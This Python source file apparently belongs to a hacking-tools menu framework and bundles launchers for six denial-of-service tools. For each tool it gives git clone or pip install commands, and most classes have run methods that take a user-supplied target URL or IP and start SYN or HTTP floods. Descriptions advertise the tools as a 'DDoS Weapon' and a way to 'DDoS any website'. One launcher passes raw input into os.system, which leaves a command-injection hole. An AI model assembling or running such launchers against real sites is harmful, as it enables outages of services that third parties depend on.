# coding=utf-8
import os
import subprocess
import sys

from core import HackingTool
from core import HackingToolsCollection


class ddos(HackingTool):
    TITLE = "ddos"
    DESCRIPTION = (
        "Best DDoS Attack Script With 36 Plus Methods."
        "DDoS attacks\n\b "
        "for SECURITY TESTING PURPOSES ONLY! "
    )

    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos && pip3 install -r requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("Enter Method >> ")
        url = input("Enter URL >> ")
        threads = input("Enter Threads >> ")
        proxylist = input("Enter ProxyList >> ")
        multiple = input("Enter Multiple >> ")
        timer = input("Enter Timer >> ")
        
        command = ["python3", "ddos/ddos.py", method, url, "socks_type5.4.1", 
                  threads, proxylist, multiple, timer]
        
        try:
            subprocess.run(command, check=True)
        except subprocess.CalledProcessError:
            print("Error executing ddos tool. Please check parameters and try again.")
        except FileNotFoundError:
            print("ddos tool not found. Make sure you have installed it correctly.")
            print("Run the install command first: git clone https://github.com/the-deepnet/ddos.git")


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = (
        "Slowloris is basically an HTTP Denial of Service attack."
        "It send lots of HTTP Request"
    )
    INSTALL_COMMANDS = ["pip3 install slowloris"]

    def run(self):
        target_site = input("Enter Target Site:- ")
        try:
            subprocess.run(["slowloris", target_site], check=True)
        except subprocess.CalledProcessError:
            print("Error executing SlowLoris. Make sure you have installed it correctly.")
        except FileNotFoundError:
            print("slowloris command not found. Make sure you have installed it correctly.")
            print("Run the install command first: pip3 install slowloris")


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = (
        "aSYNcrone is a C language based, mulltifunction SYN Flood "
        "DDoS Weapon.\nDisable the destination system by sending a "
        "SYN packet intensively to the destination."
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone && gcc aSYNcrone.c -o aSYNcrone -lpthread",
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        
        try:
            os.chdir("aSYNcrone")
            subprocess.run(["./aSYNcrone", source_port, target_ip, target_port, "1000"], check=True)
            os.chdir("..")
        except subprocess.CalledProcessError:
            print("Error executing aSYNcrone. Please check parameters and try again.")
        except FileNotFoundError:
            print("aSYNcrone not found. Make sure you have installed it correctly.")
            print("Run the install command first.")
        except Exception as e:
            print(f"Error: {str(e)}")
            os.chdir("..")


class UFONet(HackingTool):
    TITLE = "UFONet"
    DESCRIPTION = (
        "UFONet - is a free software, P2P and cryptographic "
        "-disruptive \n toolkit- that allows to perform DoS and "
        "DDoS attacks\n\b "
        "More Usage Visit"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet && python3 setup.py install && pip3 install GeoIP python-geoip pygeoip requests pycrypto pycurl whois scapy-python3",
    ]
    RUN_COMMANDS = ["cd ufonet && python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = (
        "GoldenEye is a python3 app for SECURITY TESTING PURPOSES ONLY!\n"
        "GoldenEye is a HTTP DoS Test Tool."
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/jseidl/GoldenEye.git && "
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        try:
            os.chdir("GoldenEye")
            os.system("./goldeneye.py")
            print("\033[96m Go to Directory \n [*] USAGE: ./goldeneye.py <url> [OPTIONS]")
            os.chdir("..")
        except Exception as e:
            print(f"Error: {str(e)}")
            if os.path.exists("GoldenEye"):
                os.chdir("..")


class Saphyra(HackingTool):
    TITLE = "SaphyraDDoS"
    DESCRIPTION = "A complex python code to DDoS any website with a very easy usage.!\n"
    INSTALL_COMMANDS = [
        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
        "cd Saphyra-DDoS && chmod +x saphyra.py",
    ]
    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"

    def run(self):
        url = input("Enter url>>> ")
        try:
            os.chdir("Saphyra-DDoS")
            os.system(f"python saphyra.py {url}")
            os.chdir("..")
        except Exception as e:
            print(f"Error: {str(e)}")
            if os.path.exists("Saphyra-DDoS"):
                os.chdir("..")


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [ddos(), SlowLoris(), Asyncrone(), UFONet(), GoldenEye(), Saphyra()]
